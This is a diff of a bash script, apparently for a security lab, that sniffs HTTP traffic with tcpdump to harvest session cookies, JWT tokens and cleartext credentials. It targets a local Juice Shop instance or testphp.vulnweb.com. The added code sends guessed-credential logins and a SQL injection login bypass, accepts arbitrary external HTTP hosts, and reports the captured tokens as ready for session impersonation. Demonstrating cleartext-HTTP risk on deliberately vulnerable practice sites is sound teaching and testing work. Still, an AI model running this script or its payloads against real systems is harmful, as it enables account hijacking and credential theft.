 # Wait for tcpdump to initialize
-echo "[*] Initializing packet capture..." | tee -a "$OUTPUT_FILE"
 sleep 3
 
-# Generate realistic attack traffic
-if [ "$TARGET" == "localhost" ] || [ "$TARGET" == "127.0.0.1" ]; then
-    echo "[PHASE 2] Generating Traffic & Stealing Sessions" | tee -a "$OUTPUT_FILE"
-    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | tee -a "$OUTPUT_FILE"
-    echo "[*] Simulating user activity to capture active sessions..." | tee -a "$OUTPUT_FILE"
+# Generate realistic attack traffic IN PARALLEL with real-time analysis
+if [ "$TARGET_HOST" == "localhost" ] || [ "$TARGET_HOST" == "127.0.0.1" ]; then
+    echo -e "${GREEN}[PHASE 2] Generating Traffic & Starting REAL-TIME Analysis${NC}" | tee -a "$OUTPUT_FILE"
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}" | tee -a "$OUTPUT_FILE"
+    echo -e "${WHITE}[*] Traffic will be analyzed LIVE as packets arrive...${NC}" | tee -a "$OUTPUT_FILE"
     echo "" | tee -a "$OUTPUT_FILE"
     
-    # Register a test user first
-    echo "[*] Creating test user account..." | tee -a "$OUTPUT_FILE"
-    REGISTER_RESPONSE=$(curl -s -c /tmp/cookies_${TIMESTAMP}.txt \
-        "http://$TARGET:3003/api/Users/" \
+    # Generate traffic FIRST, then analyze the captured packets
+    COOKIE_FILE="/tmp/cookies_${TIMESTAMP}.txt"
+    
+    # Register a test user
+    echo -e "${BLUE}[*] Creating test victim account...${NC}" | tee -a "$OUTPUT_FILE"
+    REGISTER_EMAIL="victim.realtime.${TIMESTAMP}@hijack.test"
+    REGISTER_RESPONSE=$(curl -s -c "$COOKIE_FILE" \
+        "http://$TARGET_HOST:3003/api/Users/" \
         -H "Content-Type: application/json" \
-        -d '{"email":"victim'${TIMESTAMP}'@hijack.test","password":"Victim123!","passwordRepeat":"Victim123!","securityQuestion":{"id":1},"securityAnswer":"blue"}' 2>/dev/null || echo "{}")
+        -d "{\"email\":\"$REGISTER_EMAIL\",\"password\":\"Victim123!\",\"passwordRepeat\":\"Victim123!\",\"securityQuestion\":{\"id\":1},\"securityAnswer\":\"blue\"}" 2>/dev/null || echo "{}")
     sleep 2
     
-    # Login attempt - this generates JWT tokens
-    echo "[*] Intercepting login with credentials..." | tee -a "$OUTPUT_FILE"
-    LOGIN_RESPONSE=$(curl -s -c /tmp/cookies_${TIMESTAMP}.txt -b /tmp/cookies_${TIMESTAMP}.txt \
-        "http://$TARGET:3003/rest/user/login" \
+    # Login attempt - triggers JWT token capture
+    echo -e "${BLUE}[*] Intercepting login credentials and session tokens...${NC}" | tee -a "$OUTPUT_FILE"
+    LOGIN_RESPONSE=$(curl -s -c "$COOKIE_FILE" -b "$COOKIE_FILE" \
+        "http://$TARGET_HOST:3003/rest/user/login" \
         -H "Content-Type: application/json" \
-        -d '{"email":"victim'${TIMESTAMP}'@hijack.test","password":"Victim123!"}' 2>/dev/null || echo "{}")
+        -d "{\"email\":\"$REGISTER_EMAIL\",\"password\":\"Victim123!\"}" 2>/dev/null || echo "{}")
     
-    # Extract JWT token from response (Juice Shop uses JWT in body, not cookies)
+    # Extract JWT token
     JWT_TOKEN=$(echo "$LOGIN_RESPONSE" | jq -r '.authentication.token // empty' 2>/dev/null)
     if [ ! -z "$JWT_TOKEN" ] && [ "$JWT_TOKEN" != "null" ]; then
-        echo "[+] JWT Session Token captured: ${JWT_TOKEN:0:50}..." | tee -a "$OUTPUT_FILE"
-        # Save token to use in subsequent requests
-        echo "Authorization: Bearer $JWT_TOKEN" > /tmp/auth_header_${TIMESTAMP}.txt
+        echo -e "${GREEN}[+] JWT Token captured in real-time!${NC}" | tee -a "$OUTPUT_FILE"
     fi
     sleep 2
     
-    # Browse products with auth token
-    echo "[*] Capturing authenticated product browsing..." | tee -a "$OUTPUT_FILE"
-    for i in {1..5}; do
+    # Generate authenticated traffic
+    echo -e "${BLUE}[*] Generating authenticated API requests...${NC}" | tee -a "$OUTPUT_FILE"
+    
+    # Make multiple requests with different patterns
+    for i in {1..8}; do
+        # Product searches
         if [ ! -z "$JWT_TOKEN" ]; then
             curl -s -H "Authorization: Bearer $JWT_TOKEN" \
-                -b /tmp/cookies_${TIMESTAMP}.txt \
-                "http://$TARGET:3003/rest/products/search?q=juice" > /dev/null 2>&1 || true
+                -b "$COOKIE_FILE" \
+                "http://$TARGET_HOST:3003/rest/products/search?q=juice" > /dev/null 2>&1 || true
         else
-            curl -s -b /tmp/cookies_${TIMESTAMP}.txt \
-                "http://$TARGET:3003/rest/products/search?q=juice" > /dev/null 2>&1 || true
+            curl -s -b "$COOKIE_FILE" \
+                "http://$TARGET_HOST:3003/rest/products/search?q=juice" > /dev/null 2>&1 || true
         fi
         sleep 1
-    done
-    
-    # Add to basket with auth
-    echo "[*] Intercepting basket operations..." | tee -a "$OUTPUT_FILE"
-    if [ ! -z "$JWT_TOKEN" ]; then
-        curl -s -H "Authorization: Bearer $JWT_TOKEN" \
-            -b /tmp/cookies_${TIMESTAMP}.txt \
-            "http://$TARGET:3003/api/BasketItems/" \
-            -H "Content-Type: application/json" \
-            -d '{"ProductId":1,"quantity":1}' > /dev/null 2>&1 || true
-    fi
-    sleep 1
-    
-    # Get challenges with auth
-    echo "[*] Capturing authenticated API requests..." | tee -a "$OUTPUT_FILE"
-    if [ ! -z "$JWT_TOKEN" ]; then
-        curl -s -H "Authorization: Bearer $JWT_TOKEN" \
-            -b /tmp/cookies_${TIMESTAMP}.txt \
-            "http://$TARGET:3003/api/Challenges" > /dev/null 2>&1 || true
-        curl -s -H "Authorization: Bearer $JWT_TOKEN" \
-            -b /tmp/cookies_${TIMESTAMP}.txt \
-            "http://$TARGET:3003/rest/basket/1" > /dev/null 2>&1 || true
-    fi
-    sleep 1
-    
-    # More realistic traffic
-    for i in {1..3}; do
-        curl -s -b /tmp/cookies_${TIMESTAMP}.txt \
-            "http://$TARGET:3003/" > /dev/null 2>&1 || true
-        curl -s -b /tmp/cookies_${TIMESTAMP}.txt \
-            "http://$TARGET:3003/rest/products/$i/reviews" > /dev/null 2>&1 || true
+        
+        # API calls with authentication
+        if [ ! -z "$JWT_TOKEN" ]; then
+            curl -s -H "Authorization: Bearer $JWT_TOKEN" \
+                -b "$COOKIE_FILE" \
+                "http://$TARGET_HOST:3003/api/Challenges" > /dev/null 2>&1 || true
+            sleep 1
+            
+            curl -s -H "Authorization: Bearer $JWT_TOKEN" \
+                -b "$COOKIE_FILE" \
+                "http://$TARGET_HOST:3003/rest/basket/1" > /dev/null 2>&1 || true
+        fi
+        sleep 1
+        
+        # Basket operations
+        if [ ! -z "$JWT_TOKEN" ]; then
+            curl -s -H "Authorization: Bearer $JWT_TOKEN" \
+                -b "$COOKIE_FILE" \
+                "http://$TARGET_HOST:3003/api/BasketItems/" \
+                -H "Content-Type: application/json" \
+                -d '{"ProductId":1,"quantity":1}' > /dev/null 2>&1 || true
+        fi
+        sleep 1
+        
+        # More API endpoints
+        curl -s -b "$COOKIE_FILE" \
+            "http://$TARGET_HOST:3003/" > /dev/null 2>&1 || true
+        curl -s -b "$COOKIE_FILE" \
+            "http://$TARGET_HOST:3003/rest/products/$i/reviews" > /dev/null 2>&1 || true
+        curl -s -b "$COOKIE_FILE" \
+            "http://$TARGET_HOST:3003/api/Quantitys" > /dev/null 2>&1 || true
+        
         sleep 2
     done
     
-    # Continue generating traffic for full capture duration
-    echo "[*] Continuing traffic generation for 40 more seconds..." | tee -a "$OUTPUT_FILE"
-    for round in {1..8}; do
-        curl -s -b /tmp/cookies_${TIMESTAMP}.txt \
-            "http://$TARGET:3003/rest/products/search?q=apple" > /dev/null 2>&1 || true
-        curl -s -b /tmp/cookies_${TIMESTAMP}.txt \
-            "http://$TARGET:3003/api/Quantitys" > /dev/null 2>&1 || true
-        curl -s -b /tmp/cookies_${TIMESTAMP}.txt \
-            "http://$TARGET:3003/rest/user/whoami" > /dev/null 2>&1 || true
-        sleep 5
+    echo -e "${GREEN}[+] Traffic generation complete${NC}" | tee -a "$OUTPUT_FILE"
+    
+    # Now analyze the captured packets
+    echo -e "${GREEN}[*] ANALYZING CAPTURED PACKETS...${NC}" | tee -a "$OUTPUT_FILE"
+    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}" | tee -a "$OUTPUT_FILE"
+    
+    python3 "$ANALYSIS_SCRIPT" "$PCAP_FILE" "$JSON_FILE" "$COOKIES_FILE" "$TOKENS_FILE" "$LIVE_CAPTURE_LOG" 2>&1 | tee -a "$OUTPUT_FILE"
+    
+    # Cleanup temp files
+    rm -f "$COOKIE_FILE" 2>/dev/null || true
+else
+    # For external HTTP sites (port 80)
+    echo -e "${GREEN}[PHASE 2] Generating HTTP Traffic & Starting REAL-TIME Analysis${NC}" | tee -a "$OUTPUT_FILE"
+    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}" | tee -a "$OUTPUT_FILE"
+    echo -e "${WHITE}[*] Targeting HTTP site on port 80...${NC}" | tee -a "$OUTPUT_FILE"
+    echo "" | tee -a "$OUTPUT_FILE"
+    
+    # Generate traffic FIRST
+    COOKIE_FILE="/tmp/cookies_${TIMESTAMP}.txt"
+    
+    # Attempt login on external HTTP site
+    echo -e "${BLUE}[*] Attempting login on external site...${NC}" | tee -a "$OUTPUT_FILE"
+    
+    # Detect if it's testphp.vulnweb.com or similar
+    if [[ "$TARGET_HOST" == *"testphp"* ]] || [[ "$TARGET_HOST" == "44.228.249.3" ]]; then
+        # Login attempts for testphp.vulnweb.com
+        echo -e "${BLUE}[*] Testing login credentials (attempt 1)...${NC}" | tee -a "$OUTPUT_FILE"
+        curl -s -c "$COOKIE_FILE" -L "http://$TARGET_HOST/login.php" \
+            -d "uname=admin&pass=admin123" \
+            -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1 || true
+        sleep 2
+        
+        echo -e "${BLUE}[*] Testing login credentials (attempt 2)...${NC}" | tee -a "$OUTPUT_FILE"
+        curl -s -c "$COOKIE_FILE" -L "http://$TARGET_HOST/login.php" \
+            -d "uname=test&pass=test" \
+            -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1 || true
+        sleep 2
+        
+        echo -e "${BLUE}[*] Testing SQL injection...${NC}" | tee -a "$OUTPUT_FILE"
+        curl -s "http://$TARGET_HOST/login.php" \
+            -d "uname=admin' OR '1'='1&pass=bypass" \
+            -H "Content-Type: application/x-www-form-urlencoded" > /dev/null 2>&1 || true
+        sleep 2
+        
+        # Access pages with session
+        echo -e "${BLUE}[*] Accessing authenticated pages...${NC}" | tee -a "$OUTPUT_FILE"
+        for page in userinfo.php profile.php admin.php categories.php cart.php; do
+            curl -s -b "$COOKIE_FILE" "http://$TARGET_HOST/$page" > /dev/null 2>&1 || true
+            sleep 1
+        done
+    else
+        # Generic HTTP site login attempts
+        echo -e "${BLUE}[*] Generating HTTP traffic to ${TARGET_HOST}...${NC}" | tee -a "$OUTPUT_FILE"
+        for i in {1..5}; do
+            curl -s "http://$TARGET_HOST/" > /dev/null 2>&1 || true
+            sleep 2
+        done
+    fi
+    
+    # Continue traffic for full capture duration
+    echo -e "${BLUE}[*] Continuing traffic generation...${NC}" | tee -a "$OUTPUT_FILE"
+    for round in {1..6}; do
+        curl -s -b "$COOKIE_FILE" "http://$TARGET_HOST/" > /dev/null 2>&1 || true
+        sleep 3
     done
     
-    echo "[+] Traffic generation complete" | tee -a "$OUTPUT_FILE"
+    echo -e "${GREEN}[+] Traffic generation complete${NC}" | tee -a "$OUTPUT_FILE"
+    
+    # Now analyze the captured packets
+    echo -e "${GREEN}[*] ANALYZING CAPTURED PACKETS...${NC}" | tee -a "$OUTPUT_FILE"
+    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}" | tee -a "$OUTPUT_FILE"
+    
+    python3 "$ANALYSIS_SCRIPT" "$PCAP_FILE" "$JSON_FILE" "$COOKIES_FILE" "$TOKENS_FILE" "$LIVE_CAPTURE_LOG" 2>&1 | tee -a "$OUTPUT_FILE"
+    
+    rm -f "$COOKIE_FILE" 2>/dev/null || true
 fi
 
 # Wait for capture to complete
-echo "[*] Waiting for packet capture to complete..." | tee -a "$OUTPUT_FILE"
+echo -e "${YELLOW}[*] Waiting for packet capture to complete...${NC}" | tee -a "$OUTPUT_FILE"
 wait $CAPTURE_BG_PID 2>/dev/null || true
 sleep 2
 
 echo "" | tee -a "$OUTPUT_FILE"
-echo "[PHASE 3] Deep Packet Analysis & Session Extraction" | tee -a "$OUTPUT_FILE"
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | tee -a "$OUTPUT_FILE"
-echo "[*] Analyzing captured packets with Python/TShark..." | tee -a "$OUTPUT_FILE"
-echo "" | tee -a "$OUTPUT_FILE"
 
-# Run advanced analysis
-python3 "$ANALYSIS_SCRIPT" "$PCAP_FILE" "$JSON_FILE" "$COOKIES_FILE" "$TOKENS_FILE" 2>&1 | tee -a "$OUTPUT_FILE"
-
-echo "" | tee -a "$OUTPUT_FILE"
-echo "[PHASE 4] Vulnerability Assessment" | tee -a "$OUTPUT_FILE"
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" | tee -a "$OUTPUT_FILE"
+echo -e "${GREEN}[PHASE 3] Final Report & Summary${NC}" | tee -a "$OUTPUT_FILE"
+echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}" | tee -a "$OUTPUT_FILE"
 echo "" | tee -a "$OUTPUT_FILE"
 
 # Display results using jq
 if [ -f "$JSON_FILE" ]; then
-    echo "═══ ATTACK STATISTICS ═══" | tee -a "$OUTPUT_FILE"
+    echo -e "${WHITE}═══ REAL-TIME CAPTURE STATISTICS ═══${NC}" | tee -a "$OUTPUT_FILE"
     jq -r '.statistics | to_entries | .[] | "  \(.key): \(.value)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
     
     echo "" | tee -a "$OUTPUT_FILE"
-    echo "═══ CAPTURED COOKIES ═══" | tee -a "$OUTPUT_FILE"
+    echo -e "${YELLOW}═══ TOP CAPTURED COOKIES (Real-Time) ═══${NC}" | tee -a "$OUTPUT_FILE"
     jq -r '.cookies[:10] | .[] | "  [\(.source)] \(.name) = \(.value[:50])"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
     
     echo "" | tee -a "$OUTPUT_FILE"
-    echo "═══ CAPTURED TOKENS ═══" | tee -a "$OUTPUT_FILE"
+    echo -e "${GREEN}═══ CAPTURED TOKENS (Real-Time) ═══${NC}" | tee -a "$OUTPUT_FILE"
     jq -r '.tokens[:10] | .[] | "  [\(.type)] \(.value)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
     
+    if [ "$(jq -r '.credentials | length' "$JSON_FILE" 2>/dev/null)" -gt 0 ]; then
+        echo "" | tee -a "$OUTPUT_FILE"
+        echo -e "${RED}═══ CAPTURED CREDENTIALS (Real-Time) ═══${NC}" | tee -a "$OUTPUT_FILE"
+        jq -r '.credentials[] | "  [\(.frame)] \(.username) / \(.password)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
+    fi
+    
     echo "" | tee -a "$OUTPUT_FILE"
-    echo "═══ CRITICAL VULNERABILITIES ═══" | tee -a "$OUTPUT_FILE"
+    echo -e "${RED}═══ CRITICAL VULNERABILITIES ═══${NC}" | tee -a "$OUTPUT_FILE"
     jq -r '.vulnerabilities | unique_by(.type) | .[] | "  [\(.severity)] \(.type)\n    → \(.detail)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
     
     echo "" | tee -a "$OUTPUT_FILE"
-    echo "═══ RISK ASSESSMENT ═══" | tee -a "$OUTPUT_FILE"
+    echo -e "${MAGENTA}═══ RISK ASSESSMENT ═══${NC}" | tee -a "$OUTPUT_FILE"
     jq -r '.risk_assessment | to_entries | .[] | "  \(.key): \(.value)"' "$JSON_FILE" 2>/dev/null | tee -a "$OUTPUT_FILE"
 fi
 
 echo "" | tee -a "$OUTPUT_FILE"
-echo "═══ EXPLOITATION PROOF ═══" | tee -a "$OUTPUT_FILE"
+echo -e "${CYAN}═══ EXPLOITATION PROOF ═══${NC}" | tee -a "$OUTPUT_FILE"
 if [ -f "$COOKIES_FILE" ] && [ -s "$COOKIES_FILE" ]; then
     COOKIE_COUNT=$(grep -v '^#' "$COOKIES_FILE" | grep -c '=' || echo "0")
-    echo "✓ $COOKIE_COUNT session cookies captured and ready for replay" | tee -a "$OUTPUT_FILE"
-    echo "✓ Cookies saved to: $COOKIES_FILE" | tee -a "$OUTPUT_FILE"
-    echo "" | tee -a "$OUTPUT_FILE"
-    echo "Attack demonstration:" | tee -a "$OUTPUT_FILE"
-    echo "  curl -b '$COOKIES_FILE' http://$TARGET:3003/api/Challenges" | tee -a "$OUTPUT_FILE"
-    echo "  ^ This would replay the hijacked session" | tee -a "$OUTPUT_FILE"
+    echo -e "${GREEN}✓ $COOKIE_COUNT session cookies captured in REAL-TIME${NC}" | tee -a "$OUTPUT_FILE"
+    echo -e "${GREEN}✓ Cookies ready for immediate replay${NC}" | tee -a "$OUTPUT_FILE"
+    echo -e "${WHITE}✓ Saved to: $COOKIES_FILE${NC}" | tee -a "$OUTPUT_FILE"
 else
-    echo "⚠ No cookies captured (target may be using HTTPS)" | tee -a "$OUTPUT_FILE"
+    echo -e "${YELLOW}⚠ No cookies captured (target may be using HTTPS)${NC}" | tee -a "$OUTPUT_FILE"
+fi
+
+if [ -f "$TOKENS_FILE" ] && [ -s "$TOKENS_FILE" ]; then
+    TOKEN_COUNT=$(grep -v '^#' "$TOKENS_FILE" | grep -c '\[' || echo "0")
+    echo -e "${GREEN}✓ $TOKEN_COUNT authentication tokens captured in REAL-TIME${NC}" | tee -a "$OUTPUT_FILE"
+    echo -e "${GREEN}✓ Tokens ready for session impersonation${NC}" | tee -a "$OUTPUT_FILE"
+    echo -e "${WHITE}✓ Saved to: $TOKENS_FILE${NC}" | tee -a "$OUTPUT_FILE"
 fi
 
 echo "" | tee -a "$OUTPUT_FILE"
-echo "╔══════════════════════════════════════════════════════════════╗" | tee -a "$OUTPUT_FILE"
-echo "║                   ATTACK COMPLETED                           ║" | tee -a "$OUTPUT_FILE"
-echo "╚══════════════════════════════════════════════════════════════╝" | tee -a "$OUTPUT_FILE"
+echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}" | tee -a "$OUTPUT_FILE"
+echo -e "${CYAN}║        REAL-TIME SESSION HIJACKING COMPLETE                  ║${NC}" | tee -a "$OUTPUT_FILE"
+echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}" | tee -a "$OUTPUT_FILE"
 echo "" | tee -a "$OUTPUT_FILE"
-echo "📊 ARTIFACTS GENERATED:" | tee -a "$OUTPUT_FILE"
-echo "   • Full Report:    $OUTPUT_FILE" | tee -a "$OUTPUT_FILE"
-echo "   • Packet Capture: $PCAP_FILE" | tee -a "$OUTPUT_FILE"
-echo "   • JSON Analysis:  $JSON_FILE" | tee -a "$OUTPUT_FILE"
-echo "   • Cookies:        $COOKIES_FILE" | tee -a "$OUTPUT_FILE"
-echo "   • Tokens:         $TOKENS_FILE" | tee -a "$OUTPUT_FILE"
+echo -e "${WHITE}📊 ARTIFACTS GENERATED:${NC}" | tee -a "$OUTPUT_FILE"
+echo -e "   ${YELLOW}• Full Report:${NC}    $OUTPUT_FILE" | tee -a "$OUTPUT_FILE"
+echo -e "   ${YELLOW}• Live Capture:${NC}   $LIVE_CAPTURE_LOG" | tee -a "$OUTPUT_FILE"
+echo -e "   ${YELLOW}• Packet Capture:${NC} $PCAP_FILE" | tee -a "$OUTPUT_FILE"
+echo -e "   ${YELLOW}• JSON Analysis:${NC}  $JSON_FILE" | tee -a "$OUTPUT_FILE"
+echo -e "   ${YELLOW}• Cookies:${NC}        $COOKIES_FILE" | tee -a "$OUTPUT_FILE"
+echo -e "   ${YELLOW}• Tokens:${NC}         $TOKENS_FILE" | tee -a "$OUTPUT_FILE"
 echo "" | tee -a "$OUTPUT_FILE"
-echo "⚠️  WARNING: This demonstrates why HTTPS is mandatory!" | tee -a "$OUTPUT_FILE"
-echo "⚠️  Captured sessions can be replayed to impersonate users!" | tee -a "$OUTPUT_FILE"
-echo "⚠️  All credentials and cookies transmitted in CLEARTEXT!" | tee -a "$OUTPUT_FILE"
+echo -e "${RED}⚠️  ALL DATA CAPTURED IN REAL-TIME AS IT HAPPENED!${NC}" | tee -a "$OUTPUT_FILE"
+echo -e "${RED}⚠️  Session tokens can impersonate users immediately!${NC}" | tee -a "$OUTPUT_FILE"
+echo -e "${RED}⚠️  Credentials transmitted in CLEARTEXT over HTTP!${NC}" | tee -a "$OUTPUT_FILE"
 echo "" | tee -a "$OUTPUT_FILE"
 
 # Cleanup
-rm -f /tmp/cookies_${TIMESTAMP}.txt "$ANALYSIS_SCRIPT" 2>/dev/null || true
+rm -f /tmp/cookies_${TIMESTAMP}.txt /tmp/auth_header_${TIMESTAMP}.txt "$ANALYSIS_SCRIPT" 2>/dev/null || true
 
 echo "ARTIFACT: $OUTPUT_FILE"
 exit 0
